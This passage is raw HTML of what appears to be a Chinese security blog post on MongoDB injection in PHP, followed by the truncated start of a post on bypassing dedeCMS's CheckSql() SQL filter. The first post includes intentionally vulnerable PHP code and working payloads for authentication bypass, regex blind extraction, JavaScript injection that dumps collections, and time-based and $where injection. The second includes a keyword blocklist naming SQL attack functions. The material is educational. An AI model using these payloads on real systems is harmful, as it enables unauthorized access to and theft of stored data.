class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.remove(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//减</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.update(&#123;&#x27;newsid&#x27;:1&#125;,&#123;&#x27;newsid&#x27;,2&#125;)&quot;</span>;    改</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>传进的是字符串变量,特别注意一下,字符串的书写语法为js的语法 然后mongodb的操作符,这个挺多的,不一一记了,丢几个重要的,其他在这篇文章里找吧 <a href="https://blog.csdn.net/qq_16313365/article/details/58599253" title="https://blog.csdn.net/qq_16313365/article/details/58599253">https://blog.csdn.net/qq_16313365/article/details/58599253</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$eq</span><br><span class="line">语法：&#123; &lt;field&gt;: &#123; $eq: &lt;value&gt; &#125; &#125;</span><br><span class="line">释义：匹配等于（=）指定值的文档</span><br><span class="line">举例：</span><br><span class="line">查询age=20的文档：</span><br><span class="line">db.person.find( &#123; age: &#123; $eq: 20 &#125; &#125; )</span><br><span class="line">相当于：</span><br><span class="line">db.person.find( &#123; age: 20 &#125; )</span><br><span class="line"></span><br><span class="line">$ne</span><br><span class="line">语法：&#123;field: &#123;$ne: value&#125; &#125;</span><br><span class="line">释义：匹配不等于（≠）指定值的文档</span><br><span class="line"></span><br><span class="line">$regex</span><br><span class="line">语法：</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: /pattern/, $options: &#x27;&lt;options&gt;&#x27; &#125; &#125;</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: &#x27;pattern&#x27;, $options: &#x27;&lt;options&gt;&#x27; &#125; &#125;</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: /pattern/&lt;options&gt; &#125; &#125;</span><br><span class="line">释义：正则表达式查询</span><br><span class="line">举例：</span><br><span class="line">db.products.find( &#123; sku: &#123; $regex: /^ABC/i &#125; &#125; )</span><br><span class="line"></span><br><span class="line">$where</span><br><span class="line">释义：把一个含有JavaScript表达式的字符串或者是整个JavaScript函数转换到查询系统中，对内嵌文档不起作用</span><br><span class="line">举例：</span><br><span class="line">db.myCollection.find( &#123; $where: &quot;this.credits == this.debits&quot; &#125; );</span><br><span class="line">db.myCollection.find( &#123; $where: function() &#123; return obj.credits == obj.debits; &#125; &#125; );</span><br></pre></td></tr></table></figure><h3 id="攻击">攻击</h3><h4 id="最简单的永真判断">1.最简单的永真判断</h4><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//选择集合</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span></span><br><span class="line">        );</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$count</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的username和password直接拿去查询,假如我们传入数组,mongodb对于我们的数组会产生解析,举个例子 我们传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>然后mongodb解析之后,最终执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;xx&#x27;:&#x27;test&#x27;&#125;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>有了这个特性,我们只用注入一个ne即可完成攻击,payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><p>那么我们能不能进一步利用,查出其他的数据呢?是可以的,利用regex来查询即可,这就相当于mysql里面的bool注</p><h4 id="盲注">2.盲注</h4><p>这里文中给了一篇14年HCTF的wp,看来这个东西很久之前就已经有人研究过,这里也是学习一下吧... 代码猜测如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//选择集合</span></span><br><span class="line"><span class="variable">$lock</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;lock&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$lock</span>)) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;lock&#x27;</span>=&gt;<span class="variable">$lock</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">count</span>()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;the lock is right,but wrong key&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;lock is wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lock</span> == <span class="string">&#x27;aabbccdd&#x27;</span>&amp;&amp;<span class="variable">$key</span>==<span class="string">&#x27;aabbccdd&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your flag is xxxxxxx&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;lock is wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后这里只给出了对或错的回显,bool一发 我们这里就简要看下他们的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=1&amp;lock[$regex]=^9</span><br><span class="line">key=1&amp;lock[$regex]=^9c</span><br><span class="line">key=1&amp;lock[$regex]=^9cc</span><br><span class="line">key=1&amp;lock[$regex]=^9cc3</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32b</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32bd</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32bd6</span><br></pre></td></tr></table></figure><p>正则匹配看lock的值是否为后面的值即可,逐位爆即可</p><h4 id="字符串拼接">字符串拼接</h4><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;var data = db.test.findOne(&#123;username:&#x27;<span class="subst">$username</span>&#x27;,password:&#x27;<span class="subst">$password</span>&#x27;&#125;);return data;&quot;</span>;</span><br><span class="line"><span class="comment">//$query = &quot;return db.test.findOne();&quot;;</span></span><br><span class="line"><span class="comment">//echo $query;</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;ok&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>]!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;errmsg&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到关键部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;var data = db.test.findOne(&#123;username:&#x27;$username&#x27;,password:&#x27;$password&#x27;&#125;);return data;&quot;;</span><br></pre></td></tr></table></figure><p>还记得前面提到的吗?mangodb的字符串拼接语法为js,那么我们只要用js语法进行构造即可,原理和普通的mysql的注入一样,只不过语言发生了小改变而已 比如我们可以写payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:1,password:2&#125;//&amp;password=test</span><br></pre></td></tr></table></figure><p>返回的是username为1,password为2 然后提一点,就是execute方法可以多语句执行,不演示,这里就列出几个payload吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test</span><br><span class="line">//爆mangodb版本</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test</span><br><span class="line">//爆test集合第一条数据</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[1]),password:2&#125;;//&amp;password=test</span><br><span class="line">//爆test集合第二条数据</span><br></pre></td></tr></table></figure><h4 id="sleep">sleep</h4><p>高版本里增加了sleep函数,那么就可以在无回显的时候进行时间盲注了,不过似乎高版本里不能用注释语句,那么闭合就好了 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#x27;1&amp;password=test</span><br><span class="line">//延时10s</span><br></pre></td></tr></table></figure><h4 id="where">where</h4><p>mangodb的where就和sql语句的where差不多,where的用法前面已经提到,是通过引入一个js函数来作为限制,当函数中存在未过滤的用户输入的时候,注入就产生了 实例代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;news; <span class="comment">//选择集合</span></span><br><span class="line"><span class="variable">$news</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;news&#x27;</span>];</span><br><span class="line"><span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.news == &#x27;<span class="subst">$news</span>&#x27;) return true&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="keyword">array</span>(<span class="string">&#x27;$where&#x27;</span>=&gt;<span class="variable">$function</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">count</span>()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;该新闻存在&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;该新闻不存在&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相当于sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> news<span class="operator">=</span><span class="string">&#x27;$news&#x27;</span></span><br></pre></td></tr></table></figure><p>检测注入的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/3.php?news=test&#x27;</span><br><span class="line">//错误</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//正确</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;2</span><br><span class="line">//错误</span><br></pre></td></tr></table></figure><p>提取信息的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames().length&gt;0&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//查看集合数量</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames()[0].length==6&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//查看集合名称长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames()[0][0]==&#x27;m&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//爆数据</span><br></pre></td></tr></table></figure><p>参考文章 <a href="https://www.secpulse.com/archives/3278.html" title="https://www.secpulse.com/archives/3278.html">https://www.secpulse.com/archives/3278.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bypass Checksql</title>
      <link href="/2018/05/28/bypass-checksql/"/>
      <url>/2018/05/28/bypass-checksql/</url>
      
        <content type="html"><![CDATA[<p>dedeCMS的CheckSql()函数,80sec开发的通用防注入ids程序..是个比较老的东西了..但是最近挖洞的时候碰到了..绕了一下,直接关键词丢google就找到了一篇文章,还搞到了函数的源码,大概地看了一下,这里就记录一下吧 先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckSql</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$querytype</span>=<span class="string">&#x27;select&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$clean</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pos</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$old_pos</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$querytype</span> == <span class="string">&#x27;select&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9a-z@\._-]&#123;1,&#125;(unionsleepbenchmarkload_fileoutfile)[^0-9a-z@\.-]&#123;1,&#125;/&#x27;</span>, <span class="variable">$sql</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$sqlSelectBreak</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span> === <span class="literal">false</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$clean</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$sql</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos1</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$pos2</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pos1</span> === <span class="literal">false</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$pos2</span> == <span class="literal">false</span>  <span class="variable">$pos2</span> &gt; <span class="variable">$pos1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$clean</span> .= <span class="string">&#x27;$s$&#x27;</span>;</span><br><span class="line">        <span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$clean</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$sql</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">    <span class="variable">$clean</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;~\s+~s&#x27;</span> ), <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>), <span class="variable">$clean</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;union&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])union($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;union detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;/*&#x27;</span>) &gt; <span class="number">2</span>  <span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">false</span>  <span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;#&#x27;</span>) !== <span class="literal">false</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;comment detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;sleep&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])sleep($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;slown down detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;benchmark&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])benchmark($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;slown down detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;load_file&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span 